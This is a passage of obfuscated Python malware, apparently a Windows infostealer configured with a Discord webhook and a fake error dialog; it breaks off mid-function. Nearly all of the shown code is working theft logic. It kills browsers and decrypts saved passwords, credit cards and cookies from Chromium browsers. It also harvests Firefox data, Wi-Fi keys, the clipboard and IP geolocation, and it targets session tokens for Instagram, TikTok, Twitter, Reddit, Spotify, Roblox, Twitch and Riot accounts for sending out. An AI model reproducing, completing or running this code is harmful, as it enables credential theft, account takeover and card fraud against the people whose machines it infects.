import ctypes
import platform
import json
import sys
import shutil
import sqlite3
from cryptography .hazmat .primitives .ciphers import Cipher ,algorithms ,modes
from cryptography .hazmat .backends import default_backend
import re
import os
import asyncio
import aiohttp
import base64
import time
import guardshield
import psutil
webhook ='https://discord.com/api/webhooks/bukismawebhookadresiniyaz'
startup_method ="regedit"
FakeError =(bool (True ),("Error","The Program can't start because javasdk is missing from your computer. Try reinstalling the program to fix this problem",0 ))#line:20
class Variables :
    Passwords =list ()
    Cards =list ()
    Cookies =list ()
    Historys =list ()
    Downloads =list ()
    Autofills =list ()
    Bookmarks =list ()
    Wifis =list ()
    SystemInfo =list ()
    ClipBoard =list ()
    Processes =list ()
    Network =list ()
    FullTokens =list ()
    ValidatedTokens =list ()
    DiscordAccounts =list ()
    SteamAccounts =list ()
    InstagramAccounts =list ()
    TwitterAccounts =list ()
    TikTokAccounts =list ()
    RedditAccounts =list ()
    TwtichAccounts =list ()
    SpotifyAccounts =list ()
    RobloxAccounts =list ()
    RiotGameAccounts =list ()
class SubModules :
    @staticmethod
    def CryptUnprotectData (O0O0O00OO00OOOO00 :bytes ,optional_entropy :str =None )->bytes :
        class O0OOOOOOO00OOO0OO (ctypes .Structure ):
            _fields_ =[("cbData",ctypes .c_ulong ),("pbData",ctypes .POINTER (ctypes .c_ubyte ))]
        OO0O0OOO00000OOO0 =O0OOOOOOO00OOO0OO (len (O0O0O00OO00OOOO00 ),ctypes .cast (O0O0O00OO00OOOO00 ,ctypes .POINTER (ctypes .c_ubyte )))
        O0OO0OO0O00000O00 =O0OOOOOOO00OOO0OO ()
        O00OO0OO0O0OO0O0O =None
        if optional_entropy is not None :
            optional_entropy =optional_entropy .encode ("utf-16")
            O00OO0OO0O0OO0O0O =O0OOOOOOO00OOO0OO (len (optional_entropy ),ctypes .cast (optional_entropy ,ctypes .POINTER (ctypes .c_ubyte )))
        if ctypes .windll .Crypt32 .CryptUnprotectData (ctypes .byref (OO0O0OOO00000OOO0 ),None ,ctypes .byref (O00OO0OO0O0OO0O0O )if O00OO0OO0O0OO0O0O is not None else None ,None ,None ,0 ,ctypes .byref (O0OO0OO0O00000O00 )):
            OOOO0OO00000O0O00 =(ctypes .c_ubyte *O0OO0OO0O00000O00 .cbData )()
            ctypes .memmove (OOOO0OO00000O0O00 ,O0OO0OO0O00000O00 .pbData ,O0OO0OO0O00000O00 .cbData )
            ctypes .windll .Kernel32 .LocalFree (O0OO0OO0O00000O00 .pbData )
            return bytes (OOOO0OO00000O0O00 )
        raise ValueError ("Invalid encrypted_data provided!")
    @staticmethod
    def GetKey (O0O00OOOOOO00O0O0 :str )->bytes :
        with open (O0O00OOOOOO00O0O0 ,"r",encoding ="utf-8",errors ="ignore")as OO0000000OO0O0OOO :
            O0OO00000000000O0 :dict =json .load (OO0000000OO0O0OOO )
            OOO000O0OOOOOOOOO :str =O0OO00000000000O0 ["os_crypt"]["encrypted_key"]
            OOO000O0OOOOOOOOO =base64 .b64decode (OOO000O0OOOOOOOOO .encode ())[5 :]
            return SubModules .CryptUnprotectData (OOO000O0OOOOOOOOO )
    @staticmethod
    def Decrpytion (OO00000O00OO0000O :bytes ,O0O0O00OO000000O0 :bytes )->str :
        try :
            O0OO0O00OOOO0OO00 =OO00000O00OO0000O .decode (errors ="ignore")
            if O0OO0O00OOOO0OO00 .startswith ("v10")or O0OO0O00OOOO0OO00 .startswith ("v11"):
                OOOOO0O0O0000OOOO =OO00000O00OO0000O [3 :15 ]
                OO00O0O0OOO00O000 =OO00000O00OO0000O [15 :]
                O00000000O0000000 =OO00O0O0OOO00O000 [-16 :]
                OO00O0O0OOO00O000 =OO00O0O0OOO00O000 [:-16 ]
                O0000OOOOOOOOO0OO =default_backend ()
                OOO0OO0O0000OOO0O =Cipher (algorithms .AES (O0O0O00OO000000O0 ),modes .GCM (OOOOO0O0O0000OOOO ,O00000000O0000000 ),backend =O0000OOOOOOOOO0OO )
                OO0OOO00O0OO0O000 =OOO0OO0O0000OOO0O .decryptor ()
                OOOOO0O0O00OO00OO =OO0OOO00O0OO0O000 .update (OO00O0O0OOO00O000 )+OO0OOO00O0OO0O000 .finalize ()
                return OOOOO0O0O00OO00OO .decode ('utf-8')
            else :
                return str (SubModules .CryptUnprotectData (OO00000O00OO0000O ))
        except :
            return "Decryption Error!, Data cant be decrypt"
    @staticmethod
    def create_mutex (OO0OO0O0OO0000OOO )->bool :
        OO0O0OOOO0O0O0OO0 =ctypes .windll .kernel32
        O00O00OO000OOO000 =OO0O0OOOO0O0O0OO0 .CreateMutexA (None ,False ,OO0OO0O0OO0000OOO )
        return OO0O0OOOO0O0O0OO0 .GetLastError ()!=183
    @staticmethod
    def IsAdmin ()->bool :
        try :
            return bool (ctypes .windll .shell32 .IsUserAnAdmin ())
        except :
            return False
class StealSystemInformation :
    async def FunctionRunner (OO0OO0O0OOO00000O )->None :
        try :
            OO0OO00O00O0000O0 =[asyncio .create_task (OO0OO0O0OOO00000O .StealSystemInformation ()),asyncio .create_task (OO0OO0O0OOO00000O .StealWifiInformation ()),asyncio .create_task (OO0OO0O0OOO00000O .StealProcessInformation ()),asyncio .create_task (OO0OO0O0OOO00000O .StealNetworkInformation ()),asyncio .create_task (OO0OO0O0OOO00000O .StealLastClipBoard ()),]
            await asyncio .gather (*OO0OO00O00O0000O0 )
        except Exception :
            pass
    async def GetDefaultSystemEncoding (OO0OO0O0OO00O0OO0 )->str :
        try :
            OOO0000OOO0OO00OO ="cmd.exe /c chcp"
            OOOO0O00OO00OO0OO =await asyncio .create_subprocess_shell (OOO0000OOO0OO00OO ,stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
            OO00O0000O00000O0 ,O0OOOO0O0O00O0OOO =await OOOO0O00OO00OO0OO .communicate ()
            return OO00O0000O00000O0 .decode (errors ="ignore").split (":")[1 ].strip ()
        except :
            return "null"
    async def StealSystemInformation (OO00OO0000O000OOO )->None :
        try :
            O0OOOO0O000OOOOOO =await OO00OO0000O000OOO .GetDefaultSystemEncoding ()
            O0O00000OOO00000O =await asyncio .create_subprocess_shell (r'echo
            OOO00O0000OO0OO0O ,O00OOOO00OO00O0O0 =await O0O00000OOO00000O .communicate ()
            Variables .SystemInfo .append (OOO00O0000OO0OO0O .decode (O0OOOO0O000OOOOOO ))
        except Exception :
            pass
    async def StealProcessInformation (O00OOOO00OOOOOO0O )->None :
        try :
            O0O0O00O00OOO000O =await asyncio .create_subprocess_shell ("tasklist /FO LIST",stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
            OOO0OOOO0OO000O00 ,O0OOO0O00OO000OO0 =await O0O0O00O00OOO000O .communicate ()
            Variables .Processes .append (OOO0OOOO0OO000O00 .decode (errors ="ignore"))
        except Exception :
            pass
    async def StealLastClipBoard (O0000000OO00OO0O0 )->None :
        try :
            OO0000O00O0O0O000 =await asyncio .create_subprocess_shell ("powershell.exe Get-Clipboard",stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
            OOO0O00OOO0OO0O0O ,OO00OOOOOO0O0OOOO =await OO0000O00O0O0O000 .communicate ()
            if OOO0O00OOO0OO0O0O :
                Variables .ClipBoard .append (OOO0O00OOO0OO0O0O .decode (errors ="ignore"))
        except Exception :
            pass
    async def StealNetworkInformation (O000000OOOO0O0OOO )->None :
        try :
            async with aiohttp .ClientSession ()as OO00O00O0O0O00000 :
                async with OO00O00O0O0O00000 .get ("http://ip-api.com/json")as O00OO0O000OOO0OO0 :
                    OO0OOO0OOOO0OOOO0 =await O00OO0O000OOO0OO0 .json ()
                    OO00OOO0OOO00OOO0 =OO0OOO0OOOO0OOOO0 ["query"]
                    OO000O0O00OOOOO00 =OO0OOO0OOOO0OOOO0 ["country"]
                    OO0OO0OO0OO000OOO =OO0OOO0OOOO0OOOO0 ["city"]
                    O00OOOOOOOO00O0OO =OO0OOO0OOOO0OOOO0 ["timezone"]
                    O0O00O00O00OO00OO =OO0OOO0OOOO0OOOO0 ["isp"]+f" {OO0OOO0OOOO0OOOO0['org']} {OO0OOO0OOOO0OOOO0['as']}"
                    Variables .Network .append ((OO00OOO0OOO00OOO0 ,OO000O0O00OOOOO00 ,OO0OO0OO0OO000OOO ,O00OOOOOOOO00O0OO ,O0O00O00O00OO00OO ))
        except Exception :
            pass
    async def StealWifiInformation (OOO0OOOOO0000O000 )->None :
        try :
            O0O0OOO0OO0OO0O00 =await OOO0OOOOO0000O000 .GetDefaultSystemEncoding ()
            OO0O00O0OOO00O0O0 =await asyncio .create_subprocess_shell ("netsh wlan show profiles",stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )
            OO0O000O0O0OO00OO ,O00OO000OO0O00000 =await OO0O00O0OOO00O0O0 .communicate ()
            OOO0OO00OOO0OO00O =None
            try :
                OOO0OO00OOO0OO00O =OO0O000O0O0OO00OO .decode (O0O0OOO0OO0OO0O00 )
            except :
                OOO0OO00OOO0OO00O =OO0O000O0O0OO00OO .decode (errors ="ignore")
            O00O000OO000OOOOO =re .findall (r'All User Profile\s*: (.*)',OOO0OO00OOO0OO00O )
            for O0000O0O0O0OO0OO0 in O00O000OO000OOOOO :
                OO0O0O0000O0OO000 =await asyncio .create_subprocess_shell (f'netsh wlan show profile name="{O0000O0O0O0OO0OO0}" key=clear',stdout =asyncio .subprocess .PIPE ,shell =True ,encoding =None )
                OO0O000O0O0OO00OO ,_O0O000O00OOO000OO =await OO0O0O0000O0OO000 .communicate ()
                try :
                    OO000OOOO0OO0O00O =OO0O000O0O0OO00OO .decode (O0O0OOO0OO0OO0O00 )
                except :OO000OOOO0OO0O00O =OO0O000O0O0OO00OO .decode (errors ="ignore")
                OOOO0O0OO0OOOO0O0 =re .search (r'Key content\s*: (.*)',OO000OOOO0OO0O00O ,re .IGNORECASE )
                Variables .Wifis .append ((O0000O0O0O0OO0OO0 ,OOOO0O0OO0OOOO0O0 .group (1 )if OOOO0O0OO0OOOO0O0 else "No password found"))
        except Exception :
            pass
class Main :
    def __init__ (O0000OO000OOOOO00 )->None :
        O0000OO000OOOOO00 .profiles_full_path =list ()
        O0000OO000OOOOO00 .RoamingAppData =os .getenv ('APPDATA')
        O0000OO000OOOOO00 .LocalAppData =os .getenv ('LOCALAPPDATA')
        O0000OO000OOOOO00 .Temp =os .getenv ('TEMP')
        O0000OO000OOOOO00 .FireFox =bool ()
        O0000OO000OOOOO00 .FirefoxFilesFullPath =list ()
        O0000OO000OOOOO00 .FirefoxCookieList =list ()
        O0000OO000OOOOO00 .FirefoxHistoryList =list ()
        O0000OO000OOOOO00 .FirefoxAutofiList =list ()
    async def FunctionRunner (O00OOOO0OO000OOO0 ):
        await O00OOOO0OO000OOO0 .kill_browsers ()
        O00OOOO0OO000OOO0 .list_profiles ()
        O00OOOO0OO000OOO0 .ListFirefoxProfiles ()
        O0O0OOO00000OO000 =[asyncio .create_task (O00OOOO0OO000OOO0 .GetPasswords ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetCards ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetCookies ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetFirefoxCookies ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetHistory ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetFirefoxHistorys ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetDownload ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetBookMark ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetAutoFill ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetFirefoxAutoFills ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetSteamSession ()),asyncio .create_task (O00OOOO0OO000OOO0 .GetTokens ()),StealSystemInformation ().FunctionRunner ()]
        await asyncio .gather (*O0O0OOO00000OO000 )
        await O00OOOO0OO000OOO0 .WriteToText ()
        await O00OOOO0OO000OOO0 .SendAllData ()
    def list_profiles (OOO00O00OOO0OO00O )->None :
        OO0O0OOO0OO0O0O00 ={'Google Chrome':os .path .join (OOO00O00OOO0OO00O .LocalAppData ,"Google","Chrome","User Data"),'Opera':os .path .join (OOO00O00OOO0OO00O .RoamingAppData ,"Opera Software","Opera Stable"),'Opera GX':os .path .join (OOO00O00OOO0OO00O .RoamingAppData ,"Opera Software","Opera GX Stable"),'Brave':os .path .join (OOO00O00OOO0OO00O .LocalAppData ,"BraveSoftware","Brave-Browser","User Data"),'Edge':os .path .join (OOO00O00OOO0OO00O .LocalAppData ,"Microsoft","Edge","User Data"),}
        for OOO0O0000OOOO0O0O ,OOOO000OOOOOO00O0 in OO0O0OOO0OO0O0O00 .items ():
            if os .path .isdir (OOOO000OOOOOO00O0 ):
                if "Opera"in OOOO000OOOOOO00O0 :
                    OOO00O00OOO0OO00O .profiles_full_path .append (OOOO000OOOOOO00O0 )
                else :
                    for OOO00OOOOOOOO0OOO ,O00O000OOOO000O00 ,OOOO00OOOO0OO0O00 in os .walk (OOOO000OOOOOO00O0 ):
                        for OOO0000OOOOOOO000 in O00O000OOOO000O00 :
                            OOO000O00O0OO0O00 =os .path .join (OOO00OOOOOOOO0OOO ,OOO0000OOOOOOO000 )
                            if OOO0000OOOOOOO000 =='Default'or OOO0000OOOOOOO000 .startswith ('Profile')or "Guest Profile"in OOO0000OOOOOOO000 :
                                OOO00O00OOO0OO00O .profiles_full_path .append (OOO000O00O0OO0O00 )
    def ListFirefoxProfiles (O00OO00O000000O0O )->None :
        try :
            OOOO00OOO000000O0 =os .path .join (O00OO00O000000O0O .RoamingAppData ,"Mozilla","Firefox","Profiles")
            if os .path .isdir (OOOO00OOO000000O0 ):
                for O0000OO0OOOO00O00 ,O0O0OOO0000O00O0O ,OO0OO0000OOO000OO in os .walk (OOOO00OOO000000O0 ):
                    for O0O0O0OOOOOO0000O in OO0OO0000OOO000OO :
                        O00OO0OOO0O00OOOO =os .path .join (O0000OO0OOOO00O00 ,O0O0O0OOOOOO0000O )
                        if O0O0O0OOOOOO0000O .endswith ("cookies.sqlite")or O0O0O0OOOOOO0000O .endswith ("places.sqlite")or O0O0O0OOOOOO0000O .endswith ("formhistory.sqlite"):
                            O00OO00O000000O0O .FirefoxFilesFullPath .append (O00OO0OOO0O00OOOO )
        except :
            pass
    async def kill_browsers (OOO0OO00000O00OO0 ):
        OO0O0OOOO0000OOO0 =["chrome.exe","opera.exe","edge.exe","firefox.exe","brave.exe"]
        O000OOOO0O00O0000 =await asyncio .create_subprocess_shell ('tasklist',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE )
        O0OO0O00OO00OO0O0 ,OO000OO0OOO00OOO0 =await O000OOOO0O00O0000 .communicate ()
        if not O000OOOO0O00O0000 .returncode !=0 :
            OO0O0OOO0O0OOOO0O =O0OO0O00OO00OO0O0 .decode (errors ="ignore").split ('\n')
            for O0O0O0O0OOOOO0000 in OO0O0OOO0O0OOOO0O :
                for O0OOOO0OOOO00OOO0 in OO0O0OOOO0000OOO0 :
                    if O0OOOO0OOOO00OOO0 .lower ()in O0O0O0O0OOOOO0000 .lower ():
                        O000OO0OOOOOOOO00 =O0O0O0O0OOOOO0000 .split ()
                        O0O00OO0O0OO0OOO0 =O000OO0OOOOOOOO00 [1 ]
                        O000OOOO0O00O0000 =await asyncio .create_subprocess_shell (f'taskkill /F /PID {O0O00OO0O0OO0OOO0}',stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE )
                        await O000OOOO0O00O0000 .communicate ()
    async def GetFirefoxCookies (O0OO0OOO0OOOOOOO0 )->None :
        try :
            for O0O00O00OOO00OOOO in O0OO0OOO0OOOOOOO0 .FirefoxFilesFullPath :
                if "cookie"in O0O00O00OOO00OOOO :
                    OOO0O0OO0OOO000O0 =sqlite3 .connect (O0O00O00OOO00OOOO )
                    OO0O00OO00O000000 =OOO0O0OO0OOO000O0 .cursor ()
                    OO0O00OO00O000000 .execute ('SELECT host, name, path, value, expiry FROM moz_cookies')
                    OOOO0O0OOO0O000O0 =None
                    OOOOO00OOOO00OOO0 =None
                    OO0000O0OOOOO0000 =OO0O00OO00O000000 .fetchall ()
                    for OOOOOOO000OO000OO in OO0000O0OOOOO0000 :
                        O0OO0OOO0OOOOOOO0 .FirefoxCookieList .append (f"{OOOOOOO000OO000OO[0]}\t{'FALSE' if OOOOOOO000OO000OO[4] == 0 else 'TRUE'}\t{OOOOOOO000OO000OO[2]}\t{'FALSE' if OOOOOOO000OO000OO[0].startswith('.') else 'TRUE'}\t{OOOOOOO000OO000OO[4]}\t{OOOOOOO000OO000OO[1]}\t{OOOOOOO000OO000OO[3]}\n")
                        if "instagram"in str (OOOOOOO000OO000OO [0 ]).lower ()and "sessionid"in str (OOOOOOO000OO000OO [1 ]).lower ():
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .InstaSession (OOOOOOO000OO000OO [3 ],"Firefox"))
                        if "tiktok"in str (OOOOOOO000OO000OO [0 ]).lower ()and str (OOOOOOO000OO000OO [1 ])=="sessionid":
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .TikTokSession (OOOOOOO000OO000OO [3 ],"Firefox"))
                        if "twitter"in str (OOOOOOO000OO000OO [0 ]).lower ()and str (OOOOOOO000OO000OO [1 ])=="auth_token":
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .TwitterSession (OOOOOOO000OO000OO [3 ],"Firefox"))
                        if "reddit"in str (OOOOOOO000OO000OO [0 ]).lower ()and "reddit_session"in str (OOOOOOO000OO000OO [1 ]).lower ():
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .RedditSession (OOOOOOO000OO000OO [3 ],"Firefox"))
                        if "spotify"in str (OOOOOOO000OO000OO [0 ]).lower ()and "sp_dc"in str (OOOOOOO000OO000OO [1 ]).lower ():
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .SpotifySession (OOOOOOO000OO000OO [3 ],"Firefox"))
                        if "roblox"in str (OOOOOOO000OO000OO [0 ]).lower ()and "ROBLOSECURITY"in str (OOOOOOO000OO000OO [1 ]):
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .RobloxSession (OOOOOOO000OO000OO [3 ],"Firefox"))
                        if "twitch"in str (OOOOOOO000OO000OO [0 ]).lower ()and "auth-token"in str (OOOOOOO000OO000OO [1 ]).lower ():
                            OOOOO00OOOO00OOO0 =OOOOOOO000OO000OO [3 ]
                        if "twitch"in str (OOOOOOO000OO000OO [0 ]).lower ()and str (OOOOOOO000OO000OO [1 ]).lower ()=="login":
                            OOOO0O0OOO0O000O0 =OOOOOOO000OO000OO [3 ]
                        if not OOOO0O0OOO0O000O0 ==None and not OOOOO00OOOO00OOO0 ==None :
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .TwitchSession (OOOOO00OOOO00OOO0 ,OOOO0O0OOO0O000O0 ,"Firefox"))
                            OOOO0O0OOO0O000O0 =None
                            OOOOO00OOOO00OOO0 =None
                        if "account.riotgames.com"in str (OOOOOOO000OO000OO [0 ]).lower ()and "sid"in str (OOOOOOO000OO000OO [1 ]).lower ():
                            asyncio .create_task (O0OO0OOO0OOOOOOO0 .RiotGamesSession (OOOOOOO000OO000OO [3 ],"Firefox"))
        except :
            pass
        else :
            O0OO0OOO0OOOOOOO0 .FireFox =True
    async def GetFirefoxHistorys (O0OOO0O0O0O00O0O0 )->None :
        try :
            for OO000000O0O00OOOO in O0OOO0O0O0O00O0O0 .FirefoxFilesFullPath :
                if "places"in OO000000O0O00OOOO :
                    O00O0O0OO000O00OO =sqlite3 .connect (OO000000O0O00OOOO )
                    OO00O0O0O000O00OO =O00O0O0OO000O00OO .cursor ()
                    OO00O0O0O000O00OO .execute ('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')
                    OO0OO00OO0000OO00 =OO00O0O0O000O00OO .fetchall ()
                    for O00OOOOO0OOOOOO0O in OO0OO00OO0000OO00 :
                        O0OOO0O0O0O00O0O0 .FirefoxHistoryList .append (f"ID: {O00OOOOO0OOOOOO0O[0]}\nRL: {O00OOOOO0OOOOOO0O[1]}\nTitle: {O00OOOOO0OOOOOO0O[2]}\nVisit Count: {O00OOOOO0OOOOOO0O[3]}\nLast Visit Time: {O00OOOOO0OOOOOO0O[4]}\n====================================================================================\n")
        except :
            pass
        else :
            O0OOO0O0O0O00O0O0 .FireFox =True
    async def GetFirefoxAutoFills (O0OO000000OO00O00 )->None :
        try :
            for OO00000OOOOO0O0O0 in O0OO000000OO00O00 .FirefoxFilesFullPath :
                if "formhistory"in OO00000OOOOO0O0O0 :
                    O0O0O00OOOOO0OOOO =sqlite3 .connect (OO00000OOOOO0O0O0 )
                    O00000000OOO000O0 =O0O0O00OOOOO0OOOO .cursor ()
                    O00000000OOO000O0 .execute ("select * from moz_formhistory")
                    OO00O0000000OOOO0 =O00000000OOO000O0 .fetchall ()
                    for OOOOO0000O0OO0O00 in OO00O0000000OOOO0 :
                        O0OO000000OO00O00 .FirefoxAutofiList .append (f"{OOOOO0000O0OO0O00}\n")
        except :
            pass
        else :
            O0OO000000OO00O00 .FireFox =True
    async def GetPasswords (O000000O0OOO0O0OO )->None :
        try :
            for OOOOO0O0O0O0O00O0 in O000000O0OOO0O0OO .profiles_full_path :
                OOO0OOOOO0O0O0OOO ="None"
                O0OO000O00O000O00 =OOOOO0O0O0O0O00O0 .find ("User Data")
                if O0OO000O00O000O00 !=-1 :
                    OO0000000O00OOO00 =OOOOO0O0O0O0O00O0 [:O0OO000O00O000O00 +len ("User Data")]
                if "Opera"in OOOOO0O0O0O0O00O0 :
                    OO0000000O00OOO00 =OOOOO0O0O0O0O00O0
                    OOO0OOOOO0O0O0OOO ="Opera"
                else :
                    OO0O000O0O0OOO0O0 =OOOOO0O0O0O0O00O0 .split ("\\")
                    OOO0OOOOO0O0O0OOO =OO0O000O0O0OOO0O0 [-4 ]+" "+OO0O000O0O0OOO0O0 [-3 ]
                O0O0O0O00OO000OOO =SubModules .GetKey (os .path .join (OO0000000O00OOO00 ,"Local State"))
                OO0OOOO0O000O0OO0 =os .path .join (OOOOO0O0O0O0O00O0 ,"Login Data")
                OO0O0OO0O0O00OOO0 =os .path .join (O000000O0OOO0O0OO .Temp ,"Logins.db")
                shutil .copyfile (OO0OOOO0O000O0OO0 ,OO0O0OO0O0O00OOO0 )
                O00O00OOOOO0O0O0O =sqlite3 .connect (OO0O0OO0O0O00OOO0 )
                O000OO000O0O00O0O =O00O00OOOOO0O0O0O .cursor ()
                O000OO000O0O00O0O .execute ('select origin_url, username_value, password_value from logins')
                OO00OO0O00OOOOO00 =O000OO000O0O00O0O .fetchall ()
                try :
                    O000OO000O0O00O0O .close ()
                    O00O00OOOOO0O0O0O .close ()
                    os .remove (OO0O0OO0O0O00OOO0 )
                except :pass
                for OOOOO0O00O00O0000 in OO00OO0O00OOOOO00 :
                    if OOOOO0O00O00O0000 [0 ]and OOOOO0O00O00O0000 [1 ]and OOOOO0O00O00O0000 [2 ]:
                        Variables .Passwords .append (f"URL : {OOOOO0O00O00O0000[0]}\nUsername : {OOOOO0O00O00O0000[1]}\nPassword : {SubModules.Decrpytion(OOOOO0O00O00O0000[2], O0O0O0O00OO000OOO)}\nBrowser : {OOO0OOOOO0O0O0OOO}\n======================================================================\n")
        except :
            pass
    async def GetCards (OO0OOO0O0O0O00O00 )->None :
        try :
            for O00OO0O0O0O0O0OO0 in OO0OOO0O0O0O00O00 .profiles_full_path :
                OO00OOOO000000O00 =O00OO0O0O0O0O0OO0 .find ("User Data")
                if OO00OOOO000000O00 !=-1 :
                    O0OO00O000OO0OO00 =O00OO0O0O0O0O0OO0 [:OO00OOOO000000O00 +len ("User Data")]
                if "Opera"in O00OO0O0O0O0O0OO0 :
                    O0OO00O000OO0OO00 =O00OO0O0O0O0O0OO0
                O00OO0OO0O00O000O =SubModules .GetKey (os .path .join (O0OO00O000OO0OO00 ,"Local State"))
                OO0OOOOO0O0O00000 =os .path .join (O00OO0O0O0O0O0OO0 ,"Web Data")
                O000O0O0O0000OOOO =os .path .join (OO0OOO0O0O0O00O00 .Temp ,"Web.db")
                shutil .copyfile (OO0OOOOO0O0O00000 ,O000O0O0O0000OOOO )
                OOO0O0O0OO0OOOOOO =sqlite3 .connect (O000O0O0O0000OOOO )
                O0OO00OOOOO00OOO0 =OOO0O0O0OO0OOOOOO .cursor ()
                O0OO00OOOOO00OOO0 .execute ('select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards')
                O0000OO0O0O0OOO00 =O0OO00OOOOO00OOO0 .fetchall ()
                try :
                    O0OO00OOOOO00OOO0 .close ()
                    OOO0O0O0OO0OOOOOO .close ()
                    os .remove (O000O0O0O0000OOOO )
                except :pass
                for OO00000000O000000 in O0000OO0O0O0OOO00 :
                    if OO00000000O000000 [2 ]<10 :
                        OOO00000OO00OOO0O ="0"+str (OO00000000O000000 [2 ])
                    else :OOO00000OO00OOO0O =OO00000000O000000 [2 ]
                    Variables .Cards .append (f"{SubModules.Decrpytion(OO00000000O000000[0], O00OO0OO0O00O000O)}\t{OOO00000OO00OOO0O}/{OO00000000O000000[1]}\t{OO00000000O000000[3]}\n")
        except :
            pass
    async def GetCookies (O0OO0O0O00OOO0O0O )->None :
        try :
            for O00O000O0O0O00OO0 in O0OO0O0O00OOO0O0O .profiles_full_path :
                OOO00OOOO00O0O0OO ="None"
                OO0O0O0O00OO000O0 =O00O000O0O0O00OO0 .find ("User Data")
                if OO0O0O0O00OO000O0 !=-1 :
                    O0OOO00OOO00O00O0 =O00O000O0O0O00OO0 [:OO0O0O0O00OO000O0 +len ("User Data")]
                if "Opera"in O00O000O0O0O00OO0 :
                    O0OOO00OOO00O00O0 =O00O000O0O0O00OO0
                    OOO00OOOO00O0O0OO ="Opera"
                else :
                    O0OOOO0O0000O0000 =O00O000O0O0O00OO0 .split ("\\")
                    OOO00OOOO00O0O0OO =O0OOOO0O0000O0000 [-4 ]+" "+O0OOOO0O0000O0000 [-3 ]
                O00O0OO0OO000O0OO =SubModules .GetKey (os .path .join (O0OOO00OOO00O00O0 ,"Local State"))
                O0O00OO00O0O0OO0O =os .path .join (O00O000O0O0O00OO0 ,"Network","Cookies")
                OO00OO0O0OOOO00O0 =os .path .join (O0OO0O0O00OOO0O0O .Temp ,"Cookies.db")
                try :
                    shutil .copyfile (O0O00OO00O0O0OO0O ,OO00OO0O0OOOO00O0 )
                except :
                    pass
                O0O00OO0OOOOOOOO0 =sqlite3 .connect (OO00OO0O0OOOO00O0 )
                O0O000OOOO000OOO0 =O0O00OO0OOOOOOOO0 .cursor ()
                O0O000OOOO000OOO0 .execute ('select host_key, name, path, encrypted_value,expires_utc from cookies')
                O0OOOOO0000O0O0OO =O0O000OOOO000OOO0 .fetchall ()
                try :
                    O0O000OOOO000OOO0 .close ()
                    O0O00OO0OOOOOOOO0 .close ()
                    os .remove (OO00OO0O0OOOO00O0 )
                except :pass
                OO000O0O00OOO0000 =None
                OO0000O0OO000OO00 =None
                for O0O0O0O000O00OOO0 in O0OOOOO0000O0O0OO :
                    OO00O0O00000O00O0 =SubModules .Decrpytion (O0O0O0O000O00OOO0 [3 ],O00O0OO0OO000O0OO )
                    Variables .Cookies .append (f"{O0O0O0O000O00OOO0[0]}\t{'FALSE' if O0O0O0O000O00OOO0[4] == 0 else 'TRUE'}\t{O0O0O0O000O00OOO0[2]}\t{'FALSE' if O0O0O0O000O00OOO0[0].startswith('.') else 'TRUE'}\t{O0O0O0O000O00OOO0[4]}\t{O0O0O0O000O00OOO0[1]}\t{OO00O0O00000O00O0}\n")
                    if "instagram"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and "sessionid"in str (O0O0O0O000O00OOO0 [1 ]).lower ():
                        asyncio .create_task (O0OO0O0O00OOO0O0O .InstaSession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))
                    if "tiktok"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and str (O0O0O0O000O00OOO0 [1 ])=="sessionid":
                        asyncio .create_task (O0OO0O0O00OOO0O0O .TikTokSession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))
                    if "twitter"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and str (O0O0O0O000O00OOO0 [1 ])=="auth_token":
                        asyncio .create_task (O0OO0O0O00OOO0O0O .TwitterSession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))
                    if "reddit"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and "reddit_session"in str (O0O0O0O000O00OOO0 [1 ]).lower ():
                        asyncio .create_task (O0OO0O0O00OOO0O0O .RedditSession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))
                    if "spotify"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and "sp_dc"in str (O0O0O0O000O00OOO0 [1 ]).lower ():
                        asyncio .create_task (O0OO0O0O00OOO0O0O .SpotifySession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))
                    if "roblox"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and "ROBLOSECURITY"in str (O0O0O0O000O00OOO0 [1 ]):
                        asyncio .create_task (O0OO0O0O00OOO0O0O .RobloxSession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))
                    if "twitch"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and "auth-token"in str (O0O0O0O000O00OOO0 [1 ]).lower ():
                        OO0000O0OO000OO00 =OO00O0O00000O00O0
                    if "twitch"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and str (O0O0O0O000O00OOO0 [1 ]).lower ()=="login":
                        OO000O0O00OOO0000 =OO00O0O00000O00O0
                    if not OO000O0O00OOO0000 ==None and not OO0000O0OO000OO00 ==None :
